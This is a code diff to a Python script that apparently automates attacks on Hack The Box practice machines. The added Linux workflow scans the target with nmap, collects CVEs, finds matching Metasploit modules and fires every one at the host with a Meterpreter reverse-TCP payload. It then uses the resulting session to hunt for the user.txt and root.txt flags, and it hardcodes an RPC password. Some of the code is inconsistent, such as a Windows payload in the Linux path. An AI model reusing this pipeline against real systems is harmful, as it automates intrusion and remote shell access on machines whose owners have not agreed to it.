@@ -56,6 +56,12 @@ def getBoxID(name: str) -> str:
             print(box.id)
             return box.id
 
+def getBoxOS(name: str) -> str:
+    for box in listOfBoxes:
+        if box.name == name.box:
+            print(box.os)
+            return box.os
+
 def auth(path: str) -> str:
         """
         Helper function to generate an authenticated URL
@@ -176,13 +182,65 @@ def windowsWorkflow():
     #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
     #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))
 
+def linuxWorkflow():
+    #Clean temporary files
+    cleanTemporaryFiles()
+    #Run nmap on machine
+    runNmap()
+    #Get CVEs
+    cveList = getCVEsFromNmap()
+    cveList = list(dict.fromkeys(cveList))
+    print(cveList)
+    #Search for exploits using searchsploit
+    exploitList = searchExploits(cveList)
+    print(exploitList)
+    # Initialize msfconsole
+    client = MsfRpcClient('NbxGWyuV', port=55552)
+    #Search for exploits in msfconsole
+    for cve in cveList:
+        os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
+        time.sleep(15)
+    #Extract them from file
+    exploitList = getExploitsFromMsf()
+    for exploit in exploitList:
+        x = exploit.split("/")
+        exploitType = x[0]
+        exploitName = exploit.replace(exploitType + "/", "")
+        #Select exploit
+        exploit = client.modules.use(exploitType, exploitName)
+        #Set targetx
+        try:
+            exploit['RHOSTS'] = getBoxIP(name)
+        except KeyError:
+            exploit['RHOST'] = getBoxIP(name)
+        #Choose payload to use
+        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+        #Set our IP
+        payload['LHOST'] = 'tun0'
+        #Run the exploit
+        print("a")
+        exploit.execute(payload=payload)
+        time.sleep(20)
+    print(client.sessions.list)
+    #Interact with the newly opened session
+    shell = client.sessions.session(list(client.sessions.list.keys())[0])
+    shell.write('getuid')
+    shell.read()
+    print(shell.run_with_output('pwd'))
+    print(shell.run_with_output('search -f user.txt'))
+    print(shell.run_with_output('search -f root.txt'))
+    #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
+    #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))
+
 
 initBoxes()
 #Switch to assign/remove box
 controlBox(name, "assign")
 #printAllBoxes()
-windowsWorkflow()
-
+if getBoxOS(name) == "Linux":
+    linuxWorkflow()
+elif getBoxOS(name) == "Windows":
+    windowsWorkflow()
 
 
 # productList = []
